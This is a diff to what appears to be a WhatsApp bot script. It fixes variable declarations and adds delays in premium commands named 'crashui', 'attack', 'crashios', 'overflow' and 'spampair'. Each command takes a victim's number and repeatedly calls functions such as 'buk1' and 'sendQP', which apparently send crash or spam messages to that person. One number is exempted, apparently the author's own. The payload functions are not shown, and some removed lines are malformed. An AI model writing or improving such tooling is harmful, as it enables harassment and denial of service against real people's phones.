@@ -1859,7 +1859,7 @@ case 'spampair': {
 			if (!q) return reply(`_Use : ${prefix+command} number\n_Example : ${prefix+command} 916909137211`)
 			let [peenis, pepekk = "200"] = q.split("|")
 			
-			let target = peenis.replace(/[^0-9]/g, '').trim()
+			target = peenis.replace(/[^0-9]/g, '').trim()
 			let {
 				default: makeWaSocket,
 				useMultiFileAuthState,
@@ -2137,7 +2137,7 @@ case 'xdroid': case 'xbeta': case 'crashui':
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
 victim = text.split("|")[0]
-let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 var contactInfo = await viper.onWhatsApp(target);
   if (victim == "6283809358811") {
     return;
@@ -2150,6 +2150,7 @@ var contactInfo = await viper.onWhatsApp(target);
   }
   
 reply(bugres)
+await sleep(1000)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
 await sleep(1500);
@@ -2181,7 +2182,7 @@ case 'fuck': case 'tzy':
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
 victim = text.split("|")[0]
-let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 var contactInfo = await viper.onWhatsApp(target);
   if (victim == "6283809358811") {
     return;
@@ -2194,6 +2195,7 @@ var contactInfo = await viper.onWhatsApp(target);
   }
 
 reply(bugres)
+await sleep(1000)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
 await sleep(1500);
@@ -2226,8 +2228,7 @@ case 'vip': case 'attack': case 'andro':
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
 victim = text.split("|")[0]
-let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net" = text.split("|")[0]
-let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 var contactInfo = await viper.onWhatsApp(target);
   if (victim == "6283809358811") {
     return;
@@ -2240,6 +2241,7 @@ var contactInfo = await viper.onWhatsApp(target);
   }
 
 reply(bugres)
+await sleep(1000)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
 await sleep(1500);
@@ -2272,8 +2274,7 @@ case 'crashios': case 'ios': case 'trashios':
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
 victim = text.split("|")[0]
-let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net" = text.split("|")[0]
-let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 var contactInfo = await viper.onWhatsApp(target);
   if (victim == "6283809358811") {
     return;
@@ -2286,6 +2287,7 @@ var contactInfo = await viper.onWhatsApp(target);
   }
 
 reply(bugres)
+await sleep(1000)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, "Punten", 1020000, Ptcp = true);
 await sendQP(target, wanted)
@@ -2306,8 +2308,7 @@ case 'overflow': case 'vipercrash': case 'crashflow':
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
 victim = text.split("|")[0]
-let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net" = text.split("|")[0]
-let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 var contactInfo = await viper.onWhatsApp(target);
   if (victim == "6283809358811") {
     return;
@@ -2320,6 +2321,7 @@ var contactInfo = await viper.onWhatsApp(target);
   }
 
 reply(bugres)
+await sleep(1000)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
 await sleep(1500);
@@ -2352,8 +2354,7 @@ case 'xeon':
 if (!isPremium) return reply(mess.only.premium)
 	if (!q) return reply(`Example:\n ${prefix + command} 91xxx`)
 victim = text.split("|")[0]
-let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net" = text.split("|")[0]
-let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 var contactInfo = await viper.onWhatsApp(target);
   if (victim == "6283809358811") {
     return;
@@ -2744,8 +2745,7 @@ case 'xvip': {
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
 victim = text.split("|")[0]
-let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net" = text.split("|")[0]
-let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 var contactInfo = await viper.onWhatsApp(target);
   if (victim == "6283809358811") {
     return;
